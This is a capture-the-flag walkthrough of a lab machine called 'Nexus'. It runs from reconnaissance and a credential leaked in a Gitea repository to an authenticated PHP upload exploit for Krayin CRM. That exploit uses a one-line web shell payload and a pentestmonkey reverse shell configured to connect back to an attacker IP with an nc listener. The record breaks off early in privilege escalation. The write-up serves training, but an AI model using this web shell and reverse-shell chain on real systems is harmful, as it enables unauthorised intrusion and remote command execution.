# Nexus

Info:
IP: 10.129.5.150

### Question 1: How many open TCP ports are listening on Nexus?

Reconnaissance:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

--> Answer: 2 ports are listening

Analysis: 
- a tcp port that support ssh service (what we are going to use to get access)
- A http server -> need to be checked out

### Question 2: What is the hiring manager's full email address?

access http:  [http://10.129.5.150](http://nexus.htb/)

now we should go ahead and add the mapping into etc/hosts

```
10.129.5.150 nexus.htb
```

--> After browsing through the Nexus Energy Authority website and clicking on the view role button. We can see that the email is: j.matthew@nexus.htb

### Question 3: What is the name of the additional subdomain hosting the Git service discovered during enumeration of nexus.htb?

--> In order to find out the subdomains of the http, we can start virtual host fuzzing to look for subdomains:
--> I notice after the first time fuzzing that invalid subdomain returns a `302` redirect of **154 bytes** so i filter out all of them:

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -w /usr/share/wordlists/dirb/common.txt -fs 154

```

We get:

```
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 254ms]
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 202ms]
```

Here we found the two subdomains --> Answer: git

Now lets update the local host resolution 

### Question 4:What is the DB_PASSWORD discovered while enumerating the exposed repository?

Entering git.nexus.htb we can see a gitea supported website with an explore options:
Clicking on explore we can see a git repository by admin with the name of krayin-docker-setup

Looking at the repo commits we can see that:

```
`DB_PASSWORD=N27xh!!2ucY04` 
with the username of krayin
```
- Looking at the .env:

```

|`DB_CONNECTION=mysql`|

|`DB_HOST=krayin-mysql`|

|`DB_PORT=3306`|

|`DB_DATABASE=krayin`|

|`DB_USERNAME=krayin`|

|`DB_PASSWORD=`|

|`DB_PREFIX=`|

|`BROADCAST_DRIVER=log`|

|`CACHE_DRIVER=file`|

|`QUEUE_CONNECTION=sync`|

|`SESSION_DRIVER=file`|

|`SESSION_LIFETIME=120`|

|`MEMCACHED_HOST=127.0.0.1`|

|`REDIS_HOST=127.0.0.1`|

|`REDIS_PASSWORD=null`|

|`REDIS_PORT=6379`|

|`MAIL_MAILER=smtp`|

|`MAIL_HOST=mailhog`|

|`MAIL_PORT=1025`|

|`MAIL_USERNAME=null`|

|`MAIL_PASSWORD=null`|

|`MAIL_ENCRYPTION=null`|

|`MAIL_FROM_ADDRESS=laravel@krayincrm.com`|

|`MAIL_FROM_NAME="${APP_NAME}"`|

|`MAIL_DOMAIN=webkul.com`|

|`MAIL_RECEIVER_DRIVER=sendgrid`|

|`IMAP_HOST=imap.nexus.htb`|

|`IMAP_PORT=993`|

|`IMAP_ENCRYPTION=ssl`|

|`IMAP_VALIDATE_CERT=true`|

|`IMAP_USERNAME=username1`|

`IMAP_PASSWORD=password1`
```
- **IMAP / Email Server Integration (`imap.nexus.htb`):**
    
    - `IMAP_HOST=imap.nexus.htb`
        
    - `IMAP_PORT=993` (SSL)
        
    - `IMAP_USERNAME=username1`
        
    - `IMAP_PASSWORD=password1`
        
    - **Significance:** This points to a mail service running internally on `imap.nexus.htb`. If standard credentials or user enumeration apply here, you may be able to read internal emails (which often contain credentials, password reset links, or internal notes).
        
- **Mail Configuration (`mailhog`):**
    
    - `MAIL_HOST=mailhog`
        
    - `MAIL_PORT=1025`
        
    - **Significance:** Mailhog is a developer email testing tool that captures outgoing emails. If Mailhog's web interface is exposed locally or via Docker port forwarding, any password reset emails or notifications sent by Krayin CRM can be intercepted directly in the browser.
- Another further look at the docker-compose.yml we can also see:

```
|`version: '3.1'`|
|`services:`|

|`krayin-app:`|

|`image: webkul/krayin:latest`|

|`ports:`|

|`- "80:80"`|

|`depends_on:`|

|`- krayin-mysql`|

|`volumes:`|

|`- ./storage:/var/www/html/storage`|

|`environment:`|

|`APP_NAME: "Krayin CRM"`|

|`APP_ENV: local`|

|`APP_DEBUG: "true"`|

|`APP_URL: http://test.htb`|

|`APP_TIMEZONE: Asia/Kolkata`|

|`APP_LOCALE: en`|

|`APP_CURRENCY: USD`|

|`DB_CONNECTION: mysql`|

|`DB_HOST: krayin-mysql`|

|`DB_PORT: 3306`|

|`DB_DATABASE: krayin`|

|`DB_USERNAME: krayin`|

|`DB_PASSWORD: ${DB_PASSWORD}`|

|`restart: unless-stopped`|

|`krayin-mysql:`|

|`image: mysql:8.0`|

|`command: --default-authentication-plugin=mysql_native_password`|

|`environment:`|

|`MYSQL_DATABASE: krayin`|

|`MYSQL_USER: krayin`|

|`MYSQL_PASSWORD: ${DB_PASSWORD}`|

|`MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD}`|

|`volumes:`|

|`- dbvolume:/var/lib/mysql`|

|`restart: unless-stopped`|

|`krayin-phpmyadmin:`|

|`image: phpmyadmin:latest`|

|`ports:`|

|`- "8080:80"`|

|`environment:`|

|`PMA_HOST: krayin-mysql`|

|`PMA_USER: krayin`|

|`PMA_PASSWORD: ${DB_PASSWORD}`|

|`restart: unless-stopped`|

```

These credentials unlocks more paths to look at like the imap service and the krayin login service

### Question 5: What version of Krayin CRM is running on the billing subdomain?

First lets go into the billing subdomain: http://billing.nexus.htb/admin/login#careers
--> Here we can see the Krayin CRM login screen: 
Lets log in using the credentials we found:
j.matthew@nexus.htb / N27xh!!2ucY04

After getting inside the account we can confirm the version of v2.2.0

### Question 6: What CVE affects Krayin CRM version 2.2.0, allowing unrestricted PHP file upload leading to remote code execution?

We can do a quick google search for this with 'Krayin CRM v2.2.0 CVE'
--> [CVE-2026-38526]
--> and this https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md PoC

### Question 7: What is the password for jones discovered during post-exploitation?

Reading the PoC of the CVE:

## Vulnerability

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#vulnerability)

Unrestricted PHP file upload via `/admin/tinymce/upload` leading to Remote Code Execution.

## Environment

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#environment)

- **Application:** Krayin CRM 2.2.x (commit `ba25b7e7`)
- **Host:** Local instance
- **Endpoint:** `POST /admin/tinymce/upload`
- **Authentication:** Required (any valid CRM user)

---

## Reproduction Steps

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#reproduction-steps)

### Step 1 — Authenticate

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#step-1--authenticate)

Log in to Krayin CRM with any valid user account and capture your session token/cookie.

---

### Step 2 — Upload PHP File

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#step-2--upload-php-file)

Send a multipart POST request to the TinyMCE upload endpoint with a PHP file as the attachment:

```httpspec
POST /admin/tinymce/upload HTTP/1.1
Host: <target>
Cookie: <authenticated session>
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
----boundary--
```

**Note:** The `Content-Type` header on the file part may be spoofed (e.g., `image/jpeg`) if the server performs content-type header validation without inspecting actual file content.

---

### Step 3 — Retrieve Upload Path

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#step-3--retrieve-upload-path)

The server returns a JSON response containing the URL of the uploaded file:

```json
{
  "location": "/storage/media/uploads/payload.php"
}
```

---

### Step 4 — Execute Arbitrary Code

[](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md#step-4--execute-arbitrary-code)

Send a GET request to the uploaded PHP file with a command parameter:

```
GET /storage/media/uploads/payload.php?cmd=id
```

**Expected response:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms Remote Code Execution in the context of the web server process.

started new session: 10.129.5.194 (ip)
--> We going to use this reverse shell file: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.255';  // CHANGE THIS
$port = 4455;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Then in the logged in krayin account --> exploit by sending the php file so that the server execute it --> in the mean time we set up burpsuite to intercept the request

changing th php file to png -> uploading and changing the png back to php 
we start a nc listener on port 4455 and then access the location:

```
http:\/\/billing.nexus.htb\/storage\/tinymce\/ed3c0d2ab40e352015d60dec44dcd0a3.php
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 4455                                 
listening on [any] 4455 ...
connect to [10.10.15.183] from (UNKNOWN) [10.129.5.194] 56654
Linux nexus 6.8.0-111-generic #111-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 11 23:16:02 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 16:00:10 up 58 min,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ shell
/bin/sh: 1: shell: not found
$ 

```

after that lets get a more stable shell

```
$ script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@nexus:/$ 

```

looking at /etc/passwd

```
jones:x:1000:1000:,,,:/home/jones:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

lets go ahead and ssh into jones:

```
ssh jones@10.129.5.194
passwd: y27xb3ha!!74GbR
```

```
jones@nexus:~$ id
id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)

jones@nexus:~$ ls
ls
user.txt
jones@nexus:~$ cat user.txt 
```
--> getting the user flag

## PRIVILIGED ESCALATION

Investigating further, we find a systemd timer running a template sync service every 2 minutes.

```
jones@nexus:~$ systemctl list-timers
systemctl list-timers
NEXT               LEFT LAST                PASSED UNIT           ACTIVATES
Fri 2026-10-…        4s Fri 2026-10-…      55s ago gitea-templat… gitea-templat…
Fri 2026-10-…  1min 36s Fri 2026-10-…     8min ago sysstat-colle… sysstat-colle…
Fri 2026-10-…     20min Fri 2026-10-…     9min ago phpsessioncle… phpsessioncle…
Fri 2026-10-…   1h 8min Fri 2026-10-…    10min ago fwupd-refresh… fwupd-refresh…
Fri 2026-10-…  5h 45min Thu 2026-04-…            - man-db.timer   man-db.service
Fri 2026-10-…        6h Mon 2025-03-…            - apt-daily.tim… apt-daily.ser…
Sat 2026-10-…        7h Fri 2026-10-… 5h 11min ago dpkg-db-backu… dpkg-db-backu…
Sat 2026-10-…        7h Fri 2026-10-… 5h 11min ago logrotate.tim… logrotate.ser…
Sat 2026-10-…        7h -                        - sysstat-summa… sysstat-summa…
Sat 2026-10-…       10h Fri 2026-10-… 3h 43min ago motd-news.tim… motd-news.ser…
Sat 2026-10-…       14h Fri 2026-10-…  5h 7min ago apt-daily-upg… apt-daily-upg…
Sat 2026-10-…       18h Fri 2026-10-…  5h 6min ago update-notifi… update-notifi…
Sat 2026-10-…       19h Fri 2026-10-… 4h 56min ago systemd-tmpfi… systemd-tmpfi…
Sun 2026-10-… 1 day 10h Fri 2026-10-… 5h 10min ago e2scrub_all.t… e2scrub_all.s…
Mon 2026-10-…    2 days Fri 2026-10-…  5h 8min ago fstrim.timer   fstrim.service
Mon 2026-10-…    2 days Mon 2026-03-…            - update-notifi… update-notifi…

16 timers listed.

```

git clone http://jones:'y27xb3ha!!74GbR'@10.129.5.194/jones/rce.git
